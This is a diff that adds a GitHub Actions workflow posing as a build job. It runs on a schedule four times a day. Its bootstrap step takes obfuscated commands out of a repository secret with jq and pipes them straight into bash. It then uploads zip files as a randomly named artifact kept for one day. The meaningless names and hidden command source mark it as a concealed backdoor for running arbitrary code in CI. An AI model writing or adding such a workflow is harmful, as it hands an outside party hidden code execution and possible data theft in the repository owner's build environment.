@@ -1,0 +1,32 @@
+name: Build Workflow
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '35 5,11,17,23 * * *'
+permissions:
+  contents: read
+  actions: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  deploy:
+    name: Main task
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+      - name: Bootstrap
+        env:
+          po352: ${{ secrets.po352 }}
+        run: |
+          printf '%s' "$po352" | jq -r .yy7969 | /bin/bash
+          printf '%s' "$pyk07" | jq -r .blbug42680 | /bin/bash
+
+      - name: Archive artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: Xw3ijE4a
+          path: "*.zip"
+          retention-days: 1
